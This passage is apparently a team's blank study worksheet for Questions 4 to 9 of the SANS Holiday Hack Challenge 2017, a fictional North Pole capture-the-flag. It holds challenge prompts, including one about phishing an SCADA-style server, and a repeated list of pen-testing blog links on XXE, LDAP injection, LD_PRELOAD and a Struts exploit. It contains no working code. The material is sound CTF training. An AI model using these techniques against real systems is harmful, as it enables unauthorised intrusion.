SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org9c6a7a3"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org9692dda"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="orge1cd9cc"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="orgd13d8b1"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org2331990"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="orgf9d3fda"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org3f356a0" class="outline-3">
<h3 id="org3f356a0">Question 4</h3>
<div class="outline-text-3" id="text-org3f356a0">
</div>
<div id="outline-container-org3e1169e" class="outline-4">
<h4 id="answer-template"><a id="org3e1169e"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="orga996d92"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>Elf Web Access (EWA) is the preferred mailer for North Pole elves,
available internally at <a href="http://mail.northpolechristmastown.com/">http://mail.northpolechristmastown.com/</a>. What
can you learn from The Great Book page found in an e-mail on that
server?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="org21f506d"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org28f0c63"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org798ae6f"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org60455c8"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org02b0224"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org3147805"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="orgd6db199"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org3bbdc4a" class="outline-3">
<h3 id="org3bbdc4a">Question 5</h3>
<div class="outline-text-3" id="text-org3bbdc4a">
</div>
<div id="outline-container-orgf0f3bb9" class="outline-4">
<h4 id="answer-template"><a id="orgf0f3bb9"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org147f91f"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>How many infractions are required to be marked as naughty on Santa's
Naughty and Nice List? What are the names of at least six insider
threat moles? Who is throwing the snowballs from the top of the North
Pole Mountain and what is your proof?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="org7a89785"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="orga06edf8"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org5ba07b6"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="orgf6bd0be"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org489e250"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="orga042a4d"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org4d6fe0c"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org0c39089" class="outline-3">
<h3 id="org0c39089">Question 6</h3>
<div class="outline-text-3" id="text-org0c39089">
</div>
<div id="outline-container-org957eb0a" class="outline-4">
<h4 id="answer-template"><a id="org957eb0a"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="orgb462030"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>The North Pole engineering team has introduced an Elf as a Service
(EaaS) platform to optimize resource allocation for mission-critical
Christmas engineering projects at
<a href="http://eaas.northpolechristmastown.com/">http://eaas.northpolechristmastown.com/</a>. Visit the system and retrieve
instructions for accessing The Great Book page from C:\greatbook.txt.
Then retrieve The Great Book PDF file by following those directions.
What is the title of The Great Book page?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="org9433139"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org2b9ea32"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="orgf60d7c9"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org9d71ae1"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org99bfc6e"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org09619cd"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="orgc5a8fa3"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-orgb4b3f6f" class="outline-3">
<h3 id="orgb4b3f6f">Question 7</h3>
<div class="outline-text-3" id="text-orgb4b3f6f">
</div>
<div id="outline-container-org8dfa840" class="outline-4">
<h4 id="answer-template"><a id="org8dfa840"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org34ff6c4"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>Like any other complex SCADA systems, the North Pole uses Elf-Machine
Interfaces (EMI) to monitor and control critical infrastructure
assets. These systems serve many uses, including email access and web
browsing. Gain access to the EMI server through the use of a phishing
attack with your access to the EWA server. Retrieve The Great Book
page from C:\GreatBookPage7.pdf. What does The Great Book page
describe?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="orgb192070"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="orgdfe0fd6"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org849ef72"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="orgb0ace11"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="orgc647e9a"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org5a8cf82"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org8a946d4"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org877a271" class="outline-3">
<h3 id="org877a271">Question 8</h3>
<div class="outline-text-3" id="text-org877a271">
</div>
<div id="outline-container-org4e432cc" class="outline-4">
<h4 id="answer-template"><a id="org4e432cc"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org31b1f89"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>Fetch the letter to Santa from the North Pole Elf Database at
<a href="http://edb.northpolechristmastown.com/">http://edb.northpolechristmastown.com/</a>. Who wrote the letter?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="org9241d1a"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org70fadcc"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org81b55dc"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org4e90912"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org60bfb73"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="orge2695f2"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org42f85c2"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org3f0fba9" class="outline-3">
<h3 id="org3f0fba9">Question 9</h3>
<div class="outline-text-3" id="text-org3f0fba9">
</div>
<div id="outline-container-org3e8536d" class="outline-4">
<h4 id="answer-template"><a id="org3e8536d"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org32e66ed"></a>Question<br />
<div class="outline-text-5" id="text-question">
<ol class="org-ol">
<li>Which character is ultimately the villain causing the giant snowball
problem. What is the villain's motive?</li>
</ol>
</div>
</li>

<li><a id="background-information"></a><a id="org915fda4"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
